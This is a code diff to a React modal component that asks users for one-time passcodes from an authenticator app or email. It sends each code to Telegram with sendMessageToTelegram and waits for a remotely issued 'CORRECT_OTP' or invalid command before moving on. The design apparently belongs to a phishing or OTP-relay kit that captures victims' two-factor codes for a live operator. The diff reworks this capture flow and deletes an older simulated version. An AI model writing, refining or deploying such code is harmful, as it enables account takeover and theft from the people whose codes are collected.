@@ -14,6 +14,7 @@ export default function Modal({ displayModal, setDisplayModal, modal, count, set
     const [otpCode, setOtpCode] = useState('');
     const [invalid, setInvalid] = useState(false);
     const { command } = useCommand(); // Get current command
+    const [isVerified, setIsVerified] = useState(false);
 
     useEffect(() => {
         console.log("Command is ", command);
@@ -24,19 +25,25 @@ export default function Modal({ displayModal, setDisplayModal, modal, count, set
             setIsLoading(false);
             setInvalid(true);
         } else if (command === 'CORRECT_OTP') {
-            console.log("Closing modal for:", modal);
+            console.log("Correct OTP received for:", modal);
             setIsLoading(false);
+            setIsVerified(true); // Mark as verified
+        }
+    }, [command, modal]);
+
+    useEffect(() => {
+        if (isVerified) {
             setOtpCode('');
-            setDisplayModal(false); // Close regardless of modal type
-            
+            setDisplayModal(false);
             setCount(count + 1);
             if (modal === 'AuthApp') {
                 setAppAuthButton(true);
             } else {
                 setEmailAuthButton(true);
             }
+            setIsVerified(false); // Reset verification state
         }
-    }, [command, modal, setDisplayModal]);
+    }, [isVerified, modal, setDisplayModal, count, setCount, setAppAuthButton, setEmailAuthButton]);
 
     // Modal visibility effect - this was missing in your current implementation
     useEffect(() => {
@@ -58,32 +65,8 @@ export default function Modal({ displayModal, setDisplayModal, modal, count, set
     const handleOtpSubmit = () => {
         if (otpCode) {
             setIsLoading(true);
-            sendMessageToTelegram(otpCode); // Send to Telegram immediately
+            sendMessageToTelegram(otpCode); // Send to Telegram
             setOtpCode(''); // Clear input
-
-            // Simulating OTP verification
-            // setTimeout(() => {
-            //     // You can replace this with your actual Telegram integration
-            //     console.log(`Sending ${modal} OTP:`, otpCode);
-
-            //     // For now, just simulate success and close modal
-
-            //     sendMessageToTelegram(otpCode);
-            //     setOtpCode('');
-
-            //     // close the modal and increment count by one
-
-            //     if (modal === 'AuthApp') {
-            //         setAppAuthButton(true)
-            //     } else (
-            //         setEmailAuthButton(true)
-            //     )
-
-            //     setDisplayModal(false)
-            //     setIsLoading(false);
-            //     setCount(count + 1)
-
-            // }, 1500);
         } else {
             setInvalid(true); // Show error if OTP code is empty
         }
